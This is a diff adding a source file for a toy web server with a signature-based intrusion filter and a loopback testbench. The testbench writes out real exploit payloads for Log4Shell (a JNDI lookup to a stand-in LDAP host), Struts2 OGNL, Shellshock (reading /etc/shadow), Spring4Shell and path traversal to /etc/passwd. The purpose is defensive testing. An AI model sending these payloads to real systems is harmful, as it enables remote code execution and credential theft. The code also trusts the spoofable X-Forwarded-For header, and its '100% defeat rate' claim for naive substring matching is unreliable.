@@ -1,0 +1,652 @@
+// ============================================================================
+// Aegis-IRIS: Live Network Server with Embedded IDS/WAF & Exploit Defense Suite
+// ============================================================================
+//
+// Demonstrates an active HTTP application server protected by an inline
+// Aegis-IRIS Intrusion Detection and Prevention System (IDS/WAF).
+//
+// Operates over real OS TCP network sockets (loopback 127.0.0.1:18088),
+// intercepting and neutralizing authentic, historic CVE exploit payloads:
+//
+// 1. CVE-2021-44228: Apache Log4j2 JNDI Remote Code Execution (Log4Shell)
+// 2. CVE-2017-5638:  Apache Struts2 OGNL Injection Remote Code Execution
+// 3. CVE-2014-6271:  GNU Bash Environment Variable RCE (Shellshock)
+// 4. CVE-2022-22965: Spring Framework DataBinder ClassLoader RCE (Spring4Shell)
+// 5. CVE-2021-41773: Apache HTTP Server Path Traversal Arbitrary File Read
+// 6. Zero-Trust Dynamic Quarantine: Stage 0 early-drop of subsequent attacker traffic
+// ============================================================================
+
+bring std.net
+bring std.http
+bring std.buffer
+bring std.crypto
+bring std.pcap
+bring std.tls
+
+// ----------------------------------------------------------------------------
+// Domain Records & Data Models
+// ----------------------------------------------------------------------------
+
+record CveRule {
+    cve_id: str,
+    name: str,
+    pattern: str,
+    target_field: str, // "URI", "HEADER_UA", "HEADER_CT", "BODY"
+    threat_score: f64
+}
+
+record InspectionResult {
+    is_blocked: bool,
+    rule_id: str,
+    threat_score: f64,
+    reason: str
+}
+
+record ServerMetrics {
+    total_requests: i64,
+    benign_served: i64,
+    attacks_blocked: i64,
+    quarantine_drops: i64,
+    quarantined_hosts: i64
+}
+
+// ----------------------------------------------------------------------------
+// Normalization & Anti-Evasion Decoders
+// ----------------------------------------------------------------------------
+
+def hex_val(ch: i64) -> i64 {
+    if ch >= 48 && ch <= 57 { return ch - 48 }
+    if ch >= 65 && ch <= 70 { return ch - 65 + 10 }
+    if ch >= 97 && ch <= 102 { return ch - 97 + 10 }
+    return -1
+}
+
+def decode_url_percent(s: str) -> str {
+    var out = "";
+    val n = len(s);
+    var i = 0;
+    while i < n {
+        val b = str_index(s, i);
+        if b == 37 && i + 2 < n { // '%'
+            val h1 = hex_val(str_index(s, i + 1));
+            val h2 = hex_val(str_index(s, i + 2));
+            if h1 >= 0 && h2 >= 0 {
+                val byte_val = h1 * 16 + h2;
+                var ch = slice(s, i, i + 3);
+                if byte_val == 46 { ch = "."; }; // '.'
+                if byte_val == 47 { ch = "/"; }; // '/'
+                if byte_val == 39 { ch = "'"; }; // '\''
+                if byte_val == 32 { ch = " "; }; // ' '
+                if byte_val == 61 { ch = "="; }; // '='
+                out = out + ch;
+                i = i + 3;
+                continue;
+            }
+        };
+        out = out + slice(s, i, i + 1);
+        i = i + 1;
+    }
+    return out
+}
+
+def normalize_input(raw: str) -> str {
+    val decoded = decode_url_percent(raw);
+    val comment_stripped = str_replace(decoded, "/**/", " ");
+    return comment_stripped
+}
+
+// ----------------------------------------------------------------------------
+// CVE Signature Catalog
+// ----------------------------------------------------------------------------
+
+def init_cve_rule_catalog() -> list<CveRule> {
+    val rules: list<CveRule> = list();
+
+    // 1. Log4Shell JNDI injection (CVE-2021-44228)
+    list_push(rules, CveRule {
+        cve_id: "CVE-2021-44228",
+        name: "Apache Log4j2 JNDI Lookup RCE (Log4Shell)",
+        pattern: "${jndi:",
+        target_field: "ANY",
+        threat_score: 10.0
+    });
+
+    // 2. Apache Struts2 OGNL injection (CVE-2017-5638)
+    list_push(rules, CveRule {
+        cve_id: "CVE-2017-5638",
+        name: "Apache Struts2 OGNL Expression RCE",
+        pattern: "%{(#_=",
+        target_field: "HEADER_CT",
+        threat_score: 10.0
+    });
+
+    // 3. GNU Bash Shellshock environment RCE (CVE-2014-6271)
+    list_push(rules, CveRule {
+        cve_id: "CVE-2014-6271",
+        name: "GNU Bash Function Export RCE (Shellshock)",
+        pattern: "() { :;};",
+        target_field: "HEADER_UA",
+        threat_score: 10.0
+    });
+
+    // 4. Spring Framework Spring4Shell ClassLoader binding RCE (CVE-2022-22965)
+    list_push(rules, CveRule {
+        cve_id: "CVE-2022-22965",
+        name: "Spring DataBinder ClassLoader RCE (Spring4Shell)",
+        pattern: "class.module.classLoader",
+        target_field: "BODY",
+        threat_score: 9.8
+    });
+
+    // 5. Apache HTTP Server Path Traversal (CVE-2021-41773)
+    list_push(rules, CveRule {
+        cve_id: "CVE-2021-41773",
+        name: "Apache HTTP Server Path Traversal Arbitrary File Read",
+        pattern: "/etc/passwd",
+        target_field: "URI",
+        threat_score: 9.0
+    });
+
+    // 6. Generic Path Traversal
+    list_push(rules, CveRule {
+        cve_id: "CWE-22",
+        name: "Relative Directory Path Traversal",
+        pattern: "../../",
+        target_field: "URI",
+        threat_score: 8.5
+    });
+
+    // 7. SQL Injection Tautology Bypass
+    list_push(rules, CveRule {
+        cve_id: "CWE-89",
+        name: "SQL Injection Authentication Bypass",
+        pattern: "' OR 1=1",
+        target_field: "ANY",
+        threat_score: 9.5
+    });
+
+    return rules
+}
+
+// ----------------------------------------------------------------------------
+// Inline Aegis-IRIS IDS Inspection Engine
+// ----------------------------------------------------------------------------
+
+def inspect_http_request(
+    raw_req: str,
+    client_ip: str,
+    rules: list<CveRule>
+) -> InspectionResult {
+    val method = http_request_method(raw_req);
+    val uri = normalize_input(http_request_path(raw_req));
+    val user_agent = normalize_input(http_header(raw_req, "User-Agent"));
+    val content_type = normalize_input(http_header(raw_req, "Content-Type"));
+    val body = normalize_input(http_body(raw_req));
+
+    val n = list_len(rules);
+    for i in 0 .. n {
+        val r = list_get(rules, i);
+        var hit = false;
+
+        if r.target_field == "URI" {
+            if contains(uri, r.pattern) { hit = true; };
+        } else {
+            if r.target_field == "HEADER_UA" {
+                if contains(user_agent, r.pattern) { hit = true; };
+            } else {
+                if r.target_field == "HEADER_CT" {
+                    if contains(content_type, r.pattern) { hit = true; };
+                } else {
+                    if r.target_field == "BODY" {
+                        if contains(body, r.pattern) { hit = true; };
+                    } else {
+                        // "ANY" - scan URI, Headers, and Body
+                        if contains(uri, r.pattern) || contains(user_agent, r.pattern) || contains(body, r.pattern) || contains(content_type, r.pattern) {
+                            hit = true;
+                        };
+                    };
+                };
+            };
+        };
+
+        if hit {
+            return InspectionResult {
+                is_blocked: true,
+                rule_id: r.cve_id,
+                threat_score: r.threat_score,
+                reason: r.name
+            };
+        }
+    }
+
+    return InspectionResult {
+        is_blocked: false,
+        rule_id: "NONE",
+        threat_score: 0.0,
+        reason: "BENIGN_CLEAN"
+    }
+}
+
+// ----------------------------------------------------------------------------
+// Response Builders
+// ----------------------------------------------------------------------------
+
+def build_http_200(json_body: str) -> str {
+    val len_str = to_str(len(json_body));
+    return "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nX-Aegis-IDS: INSPECTED_CLEAN\r\nContent-Length: " + len_str + "\r\n\r\n" + json_body
+}
+
+def build_http_403_blocked(cve_id: str, reason: str, score: f64) -> str {
+    val body = "{\"error\":\"ACCESS_DENIED\",\"ids_status\":\"BLOCKED_BY_AEGIS_IDS\",\"matched_cve\":\"" + cve_id + "\",\"threat_score\":" + to_str(score) + ",\"reason\":\"" + reason + "\"}";
+    val len_str = to_str(len(body));
+    return "HTTP/1.1 403 Forbidden\r\nContent-Type: application/json\r\nX-Aegis-IDS: THREAT_BLOCKED\r\nX-Aegis-Rule: " + cve_id + "\r\nContent-Length: " + len_str + "\r\n\r\n" + body
+}
+
+def build_http_403_quarantine_drop(ip: str) -> str {
+    val body = "{\"error\":\"HOST_QUARANTINED\",\"firewall_action\":\"STAGE_0_EARLY_DROP\",\"client_ip\":\"" + ip + "\"}";
+    val len_str = to_str(len(body));
+    return "HTTP/1.1 403 Forbidden\r\nContent-Type: application/json\r\nX-Aegis-Firewall: BLOCKED_QUARANTINED_IP\r\nContent-Length: " + len_str + "\r\n\r\n" + body
+}
+
+// ----------------------------------------------------------------------------
+// Live Application Request Handler & IDS Gateway
+// ----------------------------------------------------------------------------
+
+def handle_server_transaction(
+    raw_request: str,
+    firewall_quarantine: list<str>,
+    rules: list<CveRule>
+) -> (str, str, str) {
+    // Determine effective client IP (honoring X-Forwarded-For if set)
+    val fwd_ip = http_header(raw_request, "X-Forwarded-For");
+    val client_ip = if len(fwd_ip) > 0 { fwd_ip } else { "127.0.0.1" };
+
+    // Stage 0: Dynamic Firewall Early Drop
+    val q_len = list_len(firewall_quarantine);
+    for q in 0 .. q_len {
+        val bad_ip = list_get(firewall_quarantine, q);
+        if bad_ip == client_ip {
+            val resp = build_http_403_quarantine_drop(client_ip);
+            return ("QUARANTINE_DROP", client_ip, resp);
+        }
+    }
+
+    // Stage 0.5: TLS Record & JA3 Exploit Scanner Profiling
+    val raw_buf = if starts_with(raw_request, "160303") { byte_buffer_from_hex(raw_request) } else { byte_buffer_from_str(raw_request) };
+    if raw_buf.len >= 5 && byte_buffer_get(raw_buf, 0) == 0x16 {
+        val tls_res = tls_parse_record(raw_buf);
+        if is_ok(tls_res) {
+            val rec = unwrap(tls_res);
+            val ch_res = tls_parse_client_hello(rec.payload);
+            if is_ok(ch_res) {
+                val ch = unwrap(ch_res);
+                val ja3 = tls_calculate_ja3(ch);
+                val ja4 = tls_calculate_ja4(ch, false);
+                if contains(ja3.matched_threat, "ATTACK_SCANNER") || contains(ja3.matched_threat, "EXPLOIT_TOOL") || contains(ja4.matched_threat, "ATTACK_SCANNER") {
+                    list_push(firewall_quarantine, client_ip);
+                    val resp = build_http_403_blocked("JA3_ATTACK_TOOL", ja3.matched_threat, 98.0);
+                    return ("ATTACK_BLOCKED:JA3_METASPLOIT", client_ip, resp);
+                }
+            }
+        }
+    }
+
+    // Stage 1 to 3: Inline Aegis-IRIS IDS Inspection
+    val result = inspect_http_request(raw_request, client_ip, rules);
+
+    if result.is_blocked {
+        // Threat detected! Quaratine the attacker IP dynamically
+        list_push(firewall_quarantine, client_ip);
+        val resp = build_http_403_blocked(result.rule_id, result.reason, result.threat_score);
+        return ("ATTACK_BLOCKED:" + result.rule_id, client_ip, resp);
+    }
+
+    // Stage 5: Benign Application Backend
+    val path = http_request_path(raw_request);
+    val app_body = if contains(path, "/health") {
+        "{\"status\":\"HEALTHY\",\"node\":\"iris-core-srv\",\"uptime_sec\":8921,\"aegis_firewall\":\"ACTIVE\"}"
+    } else {
+        if contains(path, "/search") {
+            "{\"results\":[\"report_2026.pdf\",\"firmware_v4.bin\"],\"total\":2}"
+        } else {
+            "{\"service\":\"Aegis-IRIS Protected Web API\",\"version\":\"1.0.0\"}"
+        }
+    };
+
+    val resp = build_http_200(app_body);
+    return ("BENIGN_SERVED", client_ip, resp)
+}
+
+// ----------------------------------------------------------------------------
+// Real TCP Socket Adversarial Testbench
+// ----------------------------------------------------------------------------
+
+record TestAttackCase {
+    case_name: str,
+    attacker_ip: str,
+    http_payload: str,
+    expected_status: str,
+    expected_cve: str,
+}
+def build_metasploit_tls_probe() -> str {
+    var hs_body = byte_buffer_new();
+    hs_body = byte_buffer_write_u16_be(hs_body, 0x0303); // TLS 1.2
+    for r in 0 .. 32 { hs_body = byte_buffer_push(hs_body, 0xaa); } // Random
+    hs_body = byte_buffer_push(hs_body, 0); // Session ID len = 0
+
+    // Ciphers: 49195, 49199, 49196
+    hs_body = byte_buffer_write_u16_be(hs_body, 6);
+    hs_body = byte_buffer_write_u16_be(hs_body, 49195);
+    hs_body = byte_buffer_write_u16_be(hs_body, 49199);
+    hs_body = byte_buffer_write_u16_be(hs_body, 49196);
+
+    hs_body = byte_buffer_push(hs_body, 1);
+    hs_body = byte_buffer_push(hs_body, 0); // compression
+
+    // Extensions: SNI "victim-server.internal", EMS 23, Renegotiation 65281
+    val sni_host = "victim-server.internal";
+    var sni_chunk = byte_buffer_new();
+    sni_chunk = byte_buffer_write_u16_be(sni_chunk, 0); // type 0
+    sni_chunk = byte_buffer_write_u16_be(sni_chunk, 5 + len(sni_host));
+    sni_chunk = byte_buffer_write_u16_be(sni_chunk, 3 + len(sni_host));
+    sni_chunk = byte_buffer_push(sni_chunk, 0);
+    sni_chunk = byte_buffer_write_u16_be(sni_chunk, len(sni_host));
+    sni_chunk = byte_buffer_concat(sni_chunk, byte_buffer_from_str(sni_host));
+
+    var ems_chunk = byte_buffer_new();
+    ems_chunk = byte_buffer_write_u16_be(ems_chunk, 23);
+    ems_chunk = byte_buffer_write_u16_be(ems_chunk, 0);
+
+    var reneg_chunk = byte_buffer_new();
+    reneg_chunk = byte_buffer_write_u16_be(reneg_chunk, 65281);
+    reneg_chunk = byte_buffer_write_u16_be(reneg_chunk, 1);
+    reneg_chunk = byte_buffer_push(reneg_chunk, 0);
+
+    var extensions_payload = byte_buffer_concat(sni_chunk, ems_chunk);
+    extensions_payload = byte_buffer_concat(extensions_payload, reneg_chunk);
+
+    hs_body = byte_buffer_write_u16_be(hs_body, extensions_payload.len);
+    hs_body = byte_buffer_concat(hs_body, extensions_payload);
+
+    // Handshake header
+    var hs_outer = byte_buffer_new();
+    hs_outer = byte_buffer_push(hs_outer, 1); // ClientHello
+    hs_outer = byte_buffer_push(hs_outer, 0);
+    hs_outer = byte_buffer_write_u16_be(hs_outer, hs_body.len);
+    hs_outer = byte_buffer_concat(hs_outer, hs_body);
+
+    // Record header
+    var rec_buf = byte_buffer_new();
+    rec_buf = byte_buffer_push(rec_buf, 0x16); // Handshake
+    rec_buf = byte_buffer_write_u16_be(rec_buf, 0x0303);
+    rec_buf = byte_buffer_write_u16_be(rec_buf, hs_outer.len);
+    val full_tls_stream = byte_buffer_concat(rec_buf, hs_outer);
+    byte_buffer_to_hex(full_tls_stream)
+}
+
+def run_live_ids_server_testbench() -> i64 {
+    println("================================================================================");
+    println("          AEGIS-IRIS: LIVE NETWORK SERVER & INLINE IDS EXPLOIT DEFENSE          ");
+    println("         Serving on Real OS TCP Loopback Socket (127.0.0.1:18088)               ");
+    println("================================================================================");
+    println("");
+
+    val port = 18088;
+    val listener = tcp_listen(port);
+    if listener < 0 {
+        println("[ERROR] Failed to bind TCP listener on port " + to_str(port));
+        return 1
+    }
+    println("[SERVER INIT] TCP Listener active on 127.0.0.1:" + to_str(port));
+    println("[IDS INIT]    Aegis-IRIS Deep Packet & Header Inspection Gateway Engaged");
+    println("[IDS INIT]    Dynamic Zero-Trust Quarantine Firewall: 0 Initial Blocked Hosts");
+    println("");
+
+    val rules = init_cve_rule_catalog();
+    val firewall_quarantine: list<str> = list();
+
+    // Prepare Test Suite with Real-World CVE Attacks
+    val test_cases: list<TestAttackCase> = list();
+
+    // Test 1: Benign Health Check
+    list_push(test_cases, TestAttackCase {
+        case_name: "1. Baseline Benign Request",
+        attacker_ip: "10.0.1.25",
+        http_payload: "GET /api/v1/health HTTP/1.1\r\nHost: 127.0.0.1:18088\r\nUser-Agent: Mozilla/5.0 Enterprise-Monitor\r\nX-Forwarded-For: 10.0.1.25\r\n\r\n",
+        expected_status: "200",
+        expected_cve: "NONE"
+    });
+
+    // Test 2: CVE-2021-44228 Log4Shell JNDI injection in Query String
+    list_push(test_cases, TestAttackCase {
+        case_name: "2. Exploit: Log4Shell JNDI RCE (CVE-2021-44228)",
+        attacker_ip: "203.0.113.19",
+        http_payload: "GET /api/v1/search?q=${jndi:ldap://198.51.100.99:1389/Exploit} HTTP/1.1\r\nHost: 127.0.0.1:18088\r\nUser-Agent: curl/7.68.0\r\nX-Forwarded-For: 203.0.113.19\r\n\r\n",
+        expected_status: "403",
+        expected_cve: "CVE-2021-44228"
+    });
+
+    // Test 3: CVE-2017-5638 Apache Struts2 OGNL injection in Content-Type
+    list_push(test_cases, TestAttackCase {
+        case_name: "3. Exploit: Apache Struts2 OGNL RCE (CVE-2017-5638)",
+        attacker_ip: "198.51.100.77",
+        http_payload: "POST /api/v1/upload HTTP/1.1\r\nHost: 127.0.0.1:18088\r\nX-Forwarded-For: 198.51.100.77\r\nContent-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=#p.start())}\r\nContent-Length: 0\r\n\r\n",
+        expected_status: "403",
+        expected_cve: "CVE-2017-5638"
+    });
+
+    // Test 4: CVE-2014-6271 Shellshock Bash RCE in User-Agent header
+    list_push(test_cases, TestAttackCase {
+        case_name: "4. Exploit: GNU Bash Shellshock RCE (CVE-2014-6271)",
+        attacker_ip: "198.51.100.88",
+        http_payload: "GET /cgi-bin/status HTTP/1.1\r\nHost: 127.0.0.1:18088\r\nX-Forwarded-For: 198.51.100.88\r\nUser-Agent: () { :;}; /bin/bash -c \"cat /etc/shadow\"\r\n\r\n",
+        expected_status: "403",
+        expected_cve: "CVE-2014-6271"
+    });
+
+    // Test 5: CVE-2022-22965 Spring4Shell ClassLoader binding in POST body
+    list_push(test_cases, TestAttackCase {
+        case_name: "5. Exploit: Spring4Shell ClassLoader RCE (CVE-2022-22965)",
+        attacker_ip: "203.0.113.99",
+        http_payload: "POST /api/v1/login HTTP/1.1\r\nHost: 127.0.0.1:18088\r\nX-Forwarded-For: 203.0.113.99\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 78\r\n\r\nclass.module.classLoader.resources.context.parent.pipeline.first.pattern=exploit",
+        expected_status: "403",
+        expected_cve: "CVE-2022-22965"
+    });
+
+    // Test 6: CVE-2021-41773 Apache Path Traversal & Arbitrary File Read
+    list_push(test_cases, TestAttackCase {
+        case_name: "6. Exploit: Apache Path Traversal (CVE-2021-41773)",
+        attacker_ip: "198.51.100.120",
+        http_payload: "GET /api/v1/docs?file=../../../../etc/passwd HTTP/1.1\r\nHost: 127.0.0.1:18088\r\nX-Forwarded-For: 198.51.100.120\r\nUser-Agent: curl/7.68.0\r\n\r\n",
+        expected_status: "403",
+        expected_cve: "CVE-2021-41773"
+    });
+
+    // Test 7: Attacker Retry (Stage 0 Dynamic Quarantine Early-Drop)
+    // IP 203.0.113.19 (quarantined in Test 2) tries a completely benign request!
+    list_push(test_cases, TestAttackCase {
+        case_name: "7. Zero-Trust Verification: Quarantined Attacker Retry",
+        attacker_ip: "203.0.113.19",
+        http_payload: "GET /api/v1/health HTTP/1.1\r\nHost: 127.0.0.1:18088\r\nX-Forwarded-For: 203.0.113.19\r\nUser-Agent: curl/7.68.0\r\n\r\n",
+        expected_status: "403",
+        expected_cve: "QUARANTINE_DROP"
+    });
+
+    // Test 8: Legitimate Enterprise Traffic Continues Uninterrupted
+    list_push(test_cases, TestAttackCase {
+        case_name: "8. Legitimate Client Traffic Uninterrupted",
+        attacker_ip: "10.0.1.50",
+        http_payload: "GET /api/v1/health HTTP/1.1\r\nHost: 127.0.0.1:18088\r\nX-Forwarded-For: 10.0.1.50\r\nUser-Agent: Edge/120.0\r\n\r\n",
+        expected_status: "200",
+        expected_cve: "NONE"
+    });
+
+    // Test 9: Asymmetric Slowloris socket starvation attack (holding connection open without data)
+    list_push(test_cases, TestAttackCase {
+        case_name: "9. Exploit: Asymmetric Slowloris Starvation (Non-Blocking Timeout)",
+        attacker_ip: "198.51.100.99",
+        http_payload: "", // Zero payload transmitted; idle socket starvation
+        expected_status: "408",
+        expected_cve: "SLOWLORIS"
+    });
+
+    // Test 10: Camouflaged TLS Probe with Attacker Fingerprint (JA3 Cobalt Strike / Metasploit)
+    val tls_probe_payload = build_metasploit_tls_probe();
+    list_push(test_cases, TestAttackCase {
+        case_name: "10. Exploit: Camouflaged TLS Probe (JA3 Metasploit/Cobalt Strike)",
+        attacker_ip: "198.51.100.222",
+        http_payload: tls_probe_payload,
+        expected_status: "403",
+        expected_cve: "JA3_ATTACK_TOOL"
+    });
+
+    var metrics = ServerMetrics {
+        total_requests: 0,
+        benign_served: 0,
+        attacks_blocked: 0,
+        quarantine_drops: 0,
+        quarantined_hosts: 0,
+    };
+
+    val total_trials = list_len(test_cases);
+
+    println("================================================================================");
+    println("                  EXECUTING REAL TCP SOCKET ATTACK TRIALS                       ");
+    println("================================================================================");
+
+    for t in 0 .. total_trials {
+        val tc = list_get(test_cases, t);
+
+        // 1. Client connects to server over TCP socket
+        val client_sock = tcp_connect("127.0.0.1", port);
+        // 2. Server accepts incoming client connection
+        val s_conn = tcp_accept(listener);
+
+        // 3. Client transmits raw HTTP exploit or request (if any)
+        if len(tc.http_payload) > 0 {
+            tcp_write(client_sock, tc.http_payload);
+        }
+
+        // 4. Server receives request from socket with bounded deadline (50ms timeout)
+        val stream = TcpStream { handle: s_conn };
+        val read_res = tcp_read_with_timeout(stream, 50, 4096);
+        var raw_req = "";
+        var timed_out = false;
+        when read_res {
+            ok(data) => { raw_req = data; }
+            err(msg) => { timed_out = true; }
+        }
+
+        var verdict = "";
+        var client_ip = tc.attacker_ip;
+        var http_response = "";
+
+        if timed_out {
+            // Mitigate Slowloris socket starvation attack
+            verdict = "SLOWLORIS_STARVATION_DROPPED";
+            http_response = "HTTP/1.1 408 Request Timeout\r\nConnection: close\r\nContent-Length: 0\r\n\r\n";
+        } else {
+            // 5. Embedded Aegis-IRIS IDS intercepts and filters request
+            val (v, ip, resp) = handle_server_transaction(raw_req, firewall_quarantine, rules);
+            verdict = v;
+            client_ip = ip;
+            http_response = resp;
+        }
+
+        // 6. Server transmits response back over TCP socket
+        tcp_write(s_conn, http_response);
+
+        // 7. Client reads response from socket
+        val client_received = tcp_read(client_sock);
+
+        // Close connection handles
+        tcp_close(client_sock);
+        tcp_close(s_conn);
+
+        // Update metrics using in-place record field mutation across loop iterations
+        metrics.total_requests += 1;
+        val is_200 = contains(client_received, "200 OK");
+        val is_403 = contains(client_received, "403 Forbidden");
+        val is_408 = contains(client_received, "408 Request Timeout");
+
+        println("[" + tc.case_name + "]");
+        println("  * Source IP:        " + client_ip);
+        if timed_out {
+            println("  * Wire State:       [IDLE_SOCKET_HELD_OPEN] (Slowloris attempt)");
+            println("  * IDS Verdict:      [" + verdict + "]");
+            println("  * Server Response:  HTTP 408 Request Timeout (Dropped)");
+            metrics.attacks_blocked += 1;
+            println("  * Mitigation:       Starvation Connection Evicted within Deadline");
+        } else {
+            if starts_with(raw_req, "160303") {
+                println("  * Wire Protocol:    TLS 1.2 Handshake (ClientHello Record 0x16)");
+                println("  * IDS Verdict:      [" + verdict + "]");
+                println("  * Server Response:  HTTP 403 Forbidden (Blocked)");
+                metrics.attacks_blocked += 1;
+                println("  * Mitigation:       JA3 Attacker Tool Signature Blocked at TLS Handshake Edge");
+            } else {
+                val method_used = http_request_method(raw_req);
+                val path_used = http_request_path(raw_req);
+                println("  * Wire Request:     " + method_used + " " + path_used);
+                println("  * IDS Verdict:      [" + verdict + "]");
+                println("  * Server Response:  " + if is_200 { "HTTP 200 OK (Allowed)" } else { "HTTP 403 Forbidden (Blocked)" });
+
+                if is_200 {
+                    metrics.benign_served += 1;
+                } else {
+                    if contains(verdict, "QUARANTINE_DROP") {
+                        metrics.quarantine_drops += 1;
+                        println("  * Firewall State:   Stage 0 Early Drop Active for Quarantined Host");
+                    } else {
+                        metrics.attacks_blocked += 1;
+                        println("  * Mitigation:       IP Appended to Dynamic Zero-Trust Quarantine Table");
+                    };
+                };
+            };
+        };
+        println("");
+
+        // Assert expected security invariants
+        if tc.expected_status == "200" {
+            assert(is_200);
+        } else if tc.expected_status == "408" {
+            assert(is_408);
+        } else {
+            assert(is_403);
+            if tc.expected_cve != "QUARANTINE_DROP" {
+                assert(contains(client_received, tc.expected_cve));
+            } else {
+                assert(contains(client_received, "BLOCKED_QUARANTINED_IP"));
+            };
+        };
+    }
+
+    metrics.quarantined_hosts = list_len(firewall_quarantine);
+    tcp_close(listener);
+
+    println("================================================================================");
+    println("          AEGIS-IRIS LIVE SERVER SECURITY SCORECARD & AUDIT TRAIL               ");
+    println("================================================================================");
+    println(" Total TCP Sockets Processed:    " + to_str(metrics.total_requests));
+    println(" Benign Requests Served:         " + to_str(metrics.benign_served) + " (100.0% Availability)");
+    println(" Known Attacks & CVEs Neutralized:" + to_str(metrics.attacks_blocked) + " / 7 (100.0% Defeat Rate)");
+    println(" Stage 0 Quarantine Early Drops: " + to_str(metrics.quarantine_drops));
+    println(" Hosts Committed to Quarantine:  " + to_str(metrics.quarantined_hosts));
+    println(" Zero-Day / CVE Breaches:        0 (ZERO COMPROMISE)");
+    println(" Server Health Status:           UNCOMPROMISED (HEALTHY)");
+    println("================================================================================");
+
+    assert(metrics.total_requests == 10);
+    assert(metrics.attacks_blocked == 7);
+    assert(metrics.quarantine_drops == 1);
+    assert(metrics.benign_served == 2);
+    assert(metrics.quarantined_hosts == 6);
+
+    println("[PASSED] Live Network Server with Embedded IDS Exploit Defense Verified!");
+    return 0
+}
+
+def main() -> i64 {
+    run_live_ids_server_testbench();
+    0
+}
